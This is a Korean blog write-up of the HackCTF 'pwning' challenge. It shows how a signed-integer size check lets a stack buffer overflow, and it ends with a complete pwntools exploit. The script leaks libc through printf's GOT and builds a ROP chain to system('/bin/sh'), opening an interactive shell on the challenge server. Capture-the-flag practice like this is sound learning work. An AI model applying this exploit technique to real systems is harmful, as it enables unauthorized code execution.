---
layout: post
title:  "HacCTF pwning write-up"
date:   2020-02-03 19:45:55
image:  hackctf_pwning.PNG
tags:   [HackCTF]
categories: [Write-up]
---


### 1.  문제

---

**1) mitigation 확인**

![]({{ site.baseurl }}/images/write-up/HackCTF/HackCTF%20pwning/Untitled.png)

NX 비트 말고는 안걸려있다.
<br><br><br>
**2) 문제 확인**

![]({{ site.baseurl }}/images/write-up/HackCTF/HackCTF%20pwning/Untitled%201.png)

몇 바이트를 입력할 것인지 사이즈를 묻고, 해당 사이즈 만큼 값을 입력할 수 있는 공간이 나온다. 그 뒤 입력한 데이터를 출력해주고 프로그램이 종료가 된다
<br><br><br>
**3) 코드 확인**

![]({{ site.baseurl }}/images/write-up/HackCTF/HackCTF%20pwning/Untitled%202.png)

main 문은 별게 없고 vuln을 자세히 보면 된다. get_n 함수가 값을 입력할 수 있는 함수인 것같다. 또한 입력한 값의 범위는 32 미만으로 제한되어 있다.

32 미만의 값을 입력하면 get_n 함수를 한번 더 호출하여 데이터를 입력하게 된다. 그럼 get_n 함수를 살펴보자.
<br><br>
![]({{ site.baseurl }}/images/write-up/HackCTF/HackCTF%20pwning/Untitled%203.png)

while문을 돌면서 getchar()를 통해 문자열을 입력받는다. 해당 반복문을 탈출하는 조건으로는 널 값을 입력하거나, get_nt 함수의 두번째 인자로 전달된 값보다 v5가 큰 경우에 탈출한다. 그리고 마지막으로 입력한 값이 10이면 종료를 한다.

여기서 v4==10의 의미는 getchar()가 호출되어 사용자가 데이터를 입력하고 엔터를 누르면 해당 엔터에 해당하는 아스키 값인 0xa까지 같이 들어가기 때문에 문자열의 끝을 판단하기 위한 조건이다.

해당 함수가 종료되고 atoi 함수를 이용하여 nptr 변수에 저장된 문자열을 정수로 변환 한다.
<br><br><br><br>
### 2. 접근방법

---

결국 이 문제도 사용자의 입력을 받는 부분에서 시작하여 비정상적인 위치에 원하는 값을 넣고 비정상적인 코드의 동작을 유발하는 것이 목적이다.

딱 봐도 ROP로 system 함수를 띄우는 것이 최종 목표로 보인다. 그렇다면 ret 값을 변경 할수 있는지 봐야한다. 
<br><br><br>
![]({{ site.baseurl }}/images/write-up/HackCTF/HackCTF%20pwning/Untitled%204.png)

vuln 함수를 다시 보면 atoi의 반환값이 v2에 들어간다. 헌데 v2는 signed int 형이므로 음수가 입력이 가능하다. 따라서 음수가 입력가능하다는 소리이고, 이를 통해 32보다 큰 데이터를 입력할 수 있다.

확인을 하다보면 get_n 함수에서 48바이트 크기의 문자열을 아무렇게 입력하게 되면, vuln 함수의 ret 바로 직전까지 해당 데이터가 들어간 것을 알수 있다. (이는 문제를 풀다보니 꼼수아닌 꼼수로..)

결국 "A"*48 + 특정 함수 이렇게 입력을 하면 vuln 함수가 return 되고 main으로 가는 것이 아닌 삽입한 주소로 이동한다. 하지만 vuln에서는 반복적인 로직이 아니므로 바로 종료가 된다.

우리가 필요한 것은 libc의 base주소이다. 따라서 printf의 ptl, got를 이용하여 libc의 printf 주소를 leak하고 다시 vuln함수로 돌아가도록 체인을 걸어줘야 한다.

그다음 얻게 된 printf 주소로 libc database를 활용하여 원하는 오프셋을 구하여 ROP를 진행하면 된다.
<br><br><br>
![]({{ site.baseurl }}/images/write-up/HackCTF/HackCTF%20pwning/Untitled%205.png)

아래 0xf7dea020가 libc에 존재하는 printf의 주소이다.  하위 3바이트를 가지고 어느 버전의 libc인지 알아보자
<br><br><br>
![]({{ site.baseurl }}/images/write-up/HackCTF/HackCTF%20pwning/Untitled%206.png)

ubuntu20의 2.23 버전인 것을 확인할 수 있고 또한 printf, bin_sh, system 함수의 오프셋을 확인 가능하다. 이를 이용하여 ROP를 진행하면 끝이다.
<br><br><br><br><br>
### 3. 풀이

---

최종 익스코드는 다음과 같다
```python
from pwn import *
context.log_level="DEBUG"

p=remote("ctf.j0n9hyun.xyz",3019)
#p=process("./pwning")
#gdb.attach(p)
p.sendlineafter("? ","-5")

payload = "aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaa"
payload +=p32(0x8048370)
payload +=p32(0x804852f)
payload +=p32(0x804a00c)
p.sendlineafter("\n",payload)
p.recvuntil("\n")
printf_got=u32(p.recv()[:4])
log.info(hex(printf_got))


libc_base=printf_got-0x049020
system_adr=libc_base+0x0003a940
bin_adr=libc_base+0x15902b

payload2="aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaa"
payload2+=p32(system_adr)
payload2+="AAAA"
payload2+=p32(bin_adr)

p.sendline("-5")
p.sendlineafter("\n",payload2)

p.interactive()
```

<br><br><br>
### 4. 몰랐던 개념

---

모르는 개념은 없었지만, ROP를 진행하기 위해 반복문이 없어서 삽질을 좀 했다. 반복문이 없다면 만들면 될것을..

이렇게 반복문이 없는 로직에서 직접 해당 함수로 다시 돌아가는 ROP 문제를 몇개 풀었었는데 이젠 까먹지 말자.